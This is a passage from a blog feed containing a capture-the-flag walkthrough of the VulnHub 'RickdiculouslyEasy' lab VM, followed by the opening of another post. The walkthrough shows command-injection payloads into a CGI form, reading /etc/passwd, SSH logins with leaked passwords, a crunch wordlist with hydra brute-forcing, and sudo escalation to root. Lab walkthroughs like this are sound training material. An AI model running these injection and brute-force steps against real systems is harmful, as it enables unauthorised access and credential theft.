&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Morty's Website&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;Wow Morty real clever. Storing passwords in a file called passwords.html? You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. That's the last thing I need.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--Password: winter--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another result of this scan was &lt;strong&gt;robots.txt&lt;/strong&gt; file, which we can check now.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Root shell console?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://10.0.2.15/cgi-bin/root_shell.cgi
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Root Shell
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
--UNDER CONSTRUCTION--
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--I'm sorry Morty. It's a bummer.--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s bad, it would have been so much easier. Now let’s check the &lt;strong&gt;tracertool&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.15/cgi-bin/tracertool.cgi
&quot;;whoami;
apache&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s a form that is vulnerable to &lt;strong&gt;command injection&lt;/strong&gt;. But as you can see, someone replaced the &lt;strong&gt;cat&lt;/strong&gt; command with the ASCII art of actuall cat.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;cat tracertool.cgi
                      _
                     | \
                     | |
                     | |
 |\                   | |
/, ~\                / /
X     `-.....-------./ /
~-. ~  ~              |
    \             /    |
    \  /_     ___\   /
    | /\ ~~~~~   \  |
    | | \        || |
    | |\ \       || )
    (_/ (_/      ((_/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Fortunately there are more commands allowing us to view text such as &lt;strong&gt;more&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;;more /etc/passwd;
::::::::::::::
/etc/passwd
::::::::::::::
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:997:996:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
chrony:x:995:993::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I know that we have a password to one of these accounts, but to which one? Let’s check it using the &lt;strong&gt;ssh&lt;/strong&gt; port 22222.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 Summer@10.0.2.15
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Last failed login: Wed Nov  1 21:17:04 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 2 failed login attempts since the last successful login.
Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
[Summer@localhost ~]$ whoami
Summer&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s working! Now we can take a look around the system.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[Summer@localhost ~]$ ls -la
total 20
drwx------. 2 Summer Summer  99 Sep 15 11:49 .
drwxr-xr-x. 5 root   root    52 Aug 18 18:20 ..
-rw-------. 1 Summer Summer   1 Sep 15 11:51 .bash_history
-rw-r--r--. 1 Summer Summer  18 May 30 14:53 .bash_logout
-rw-r--r--. 1 Summer Summer 193 May 30 14:53 .bash_profile
-rw-r--r--. 1 Summer Summer 231 May 30 14:53 .bashrc
-rw-rw-r--. 1 Summer Summer  48 Aug 22 02:46 FLAG.txt
[Summer@localhost ~]$ more FLAG.txt
FLAG{Get off the high road Summer!} - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag, and that’s &lt;strong&gt;50pts&lt;/strong&gt; already. Almost half way through.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 0
drwxr-xr-x.  5 root        root         52 Aug 18 18:20 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x. 17 root        root        236 Aug 18 19:16 ..
drwxr-xr-x.  2 Morty       Morty       131 Sep 15 11:49 Morty
drwxr-xr-x.  4 RickSanchez RickSanchez 113 Sep 21 10:30 RickSanchez
drwx------.  2 Summer      Summer       99 Sep 15 11:49 Summer
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; Morty
total 64
drwxr-xr-x. 2 Morty Morty   131 Sep 15 11:49 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root  root     52 Aug 18 18:20 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty     1 Sep 15 11:51 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty    18 May 30 14:53 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   193 May 30 14:53 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 Morty Morty   231 May 30 14:53 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root  43145 Aug 22 03:04 Safe_Password.jpg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 root  root    414 Aug 22 03:06 journal.txt.zip

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Summer@localhost home]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; RickSanchez
total 12
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root        root         52 Aug 18 18:20 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  18 May 30 14:53 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 193 May 30 14:53 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez 231 May 30 14:53 .bashrc
drwxr-xr-x. 2 RickSanchez RickSanchez  18 Sep 21 09:50 RICKS_SAFE
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 ThisDoesntContainAnyFlags&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That’s what we want to investigate now, contents of both Rick and Morty home directories. Let’s start with &lt;strong&gt;Morty&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/Morty/Safe_Password.jpg ~
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Safe_Password.jpg                             100%   42KB  10.8MB/s   00:00
root@kali:~# scp -P 22222 Summer@10.0.2.15:/home/Morty/journal.txt.zip ~
Summer@10.0.2.15'&lt;/span&gt;s password:
journal.txt.zip                               100%  414   241.4KB/s   00:00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After copying files using &lt;strong&gt;scp&lt;/strong&gt;, we can safely investigate them on our machine. Unfortuntely zip file is password protected.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;journal.txt.zip] journal.txt password:
password incorrect--reenter:
password incorrect--reenter:
   skipping: journal.txt             incorrect password
   root@kali:~# strings Safe_Password.jpg
   JFIF
   Exif
   8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
   8BIM
   8BIM
   &lt;span class=&quot;nv&quot;&gt;$3br&lt;/span&gt;
   %&amp;amp;&lt;span class=&quot;s1&quot;&gt;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   	#3R
   &amp;amp;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
   0D000D&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;DDD&lt;span class=&quot;se&quot;&gt;\t\\\\\t&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Which was revealed by using &lt;strong&gt;string&lt;/strong&gt; command. Now we can unzip it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# unzip journal.txt.zip
Archive:  journal.txt.zip
[journal.txt.zip] journal.txt password:
  inflating: journal.txt             
root@kali:~# cat journal.txt
Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag that brings us to &lt;strong&gt;70pts&lt;/strong&gt;. And a password to the safe!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# scp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 22222 Summer@10.0.2.15:/home/RickSanchez/RICKS_SAFE/safe ~
Summer@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
safe                                          100% 8704     2.8MB/s   00:00
root@kali:~# binwalk safe

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This file was indentified by &lt;strong&gt;binwalk&lt;/strong&gt; as an executable. Let’s run it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
./safe: error &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But firstly, we have to install mcrypt library.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to go and run the program with proper argument.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ./safe 131333
decrypt: 	FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;And Awwwaaaaayyyy we Go!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 20 Points

Ricks password hints:
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;This is incase I forget.. I just hope I don&lt;span class=&quot;s1&quot;&gt;'t forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.�	@&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another flag, summing up to &lt;strong&gt;90pts&lt;/strong&gt;, together with a clue to the Rick’s password.&lt;/p&gt;

&lt;p&gt;Firsly we know that Rick played in band called “The Flesh Curtains”, so we can extract each of the word into a different password combination. To make wordlists simpler and smaller, I decided to firstly create a list maching this pattern - A-Z:0-9:&amp;lt;one of the 3 words&amp;gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# crunch 5 5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%The &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 1560 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 7 7 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Flesh &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 2080 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260
root@kali:~# crunch 10 10 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ,%Curtains &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; rick.txt
Crunch will now generate the following amount of data: 2860 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 260&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can run &lt;strong&gt;hydra&lt;/strong&gt; and crack the password.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; RickSanchez &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; rick.txt ssh://10.0.2.15 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 22222
Hydra v8.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2017 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-11-01 07:54:44
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Restorefile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;you have 10 seconds to abort... &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use option &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; to skip waiting&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; from a previous session found, to prevent overwriting, ./hydra.restore
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 16 tasks, 780 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:780&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~49 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking ssh://10.0.2.15:22222/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22222][ssh] host: 10.0.2.15   login: RickSanchez   password: P7Curtains
1 of 1 target successfully completed, 1 valid password found
Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2017-11-01 07:55:24&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Got it! &lt;strong&gt;P7Curtains&lt;/strong&gt; is the password, so we can now log in once again.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22222 RickSanchez@10.0.2.15
RickSanchez@10.0.2.15&lt;span class=&quot;s1&quot;&gt;'s password:
Permission denied, please try again.
RickSanchez@10.0.2.15'&lt;/span&gt;s password:
Last failed login: Wed Nov  1 22:57:05 AEDT 2017 from 10.0.2.4 on ssh:notty
There were 272 failed login attempts since the last successful login.
Last login: Thu Sep 21 09:45:24 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another directory was just a troll.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ThisDoesntContainAnyFlags/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 4
drwxrwxr-x. 2 RickSanchez RickSanchez  26 Aug 18 20:26 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 4 RickSanchez RickSanchez 113 Sep 21 10:30 ..
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 RickSanchez RickSanchez  95 Aug 18 20:26 NotAFlag.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ThisDoesntContainAnyFlags]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;more NotAFlag.txt
hhHHAaaaAAGgGAh. You totally fell &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;it... Classiiiigihhic.
But seriously this isn&lt;span class=&quot;s1&quot;&gt;'t a flag..&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Wait, we can use &lt;strong&gt;sudo&lt;/strong&gt; with Rick’s password to log in as &lt;strong&gt;root&lt;/strong&gt;. That’s awesome.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RickSanchez@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RickSanchez:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost RickSanchez]# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
dr-xr-x---.  4 root root  191 Aug 25 14:30 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
dr-xr-xr-x. 17 root root  236 Aug 18 19:16 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Nov  1 23:02 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   18 Feb 12  2017 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  176 Feb 12  2017 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  100 Feb 12  2017 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   32 Aug 22 10:16 .lesshst
drwxr-----.  3 root root   19 Aug 21 17:35 .pki
drwx------.  2 root root   25 Aug 22 08:21 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root  129 Feb 12  2017 .tcshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root   40 Aug 22 07:37 FLAG.txt
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  1 root root 1214 Aug 18 18:16 anaconda-ks.cfg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# more FLAG.txt
FLAG: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Ionic Defibrillator&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 30 points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here’s another flag, giving us a total of &lt;strong&gt;120pts&lt;/strong&gt;. Where are the last 20? Probably port 60000, as we never checked what’s inside.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# telnet 10.0.2.15 60000
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Welcome to Ricks half baked reverse shell...
&lt;span class=&quot;c&quot;&gt;# ls -la&lt;/span&gt;
FLAG.txt
&lt;span class=&quot;c&quot;&gt;# more FLAG.txt&lt;/span&gt;
: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
&lt;span class=&quot;c&quot;&gt;# cat FLAG.txt&lt;/span&gt;
FLAG&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Flip the pickle Morty!&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; - 10 Points&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And there was the last flag - &lt;strong&gt;130/130pts&lt;/strong&gt;.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/vulnhub-rickdiculouslyeasy/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-rickdiculouslyeasy/</guid>
      </item>
    
      <item>
        <title>Gynvael Polish Mission 010</title>
        <description>&lt;p&gt;Let's get back to work, and as Gynvael started streaming again, his mission should be great start. &lt;/p&gt;

&lt;pre&gt;
MISSION 010            goo.gl/oAdvWe                  DIFFICULTY: ███░░░░░░░ [3/10]
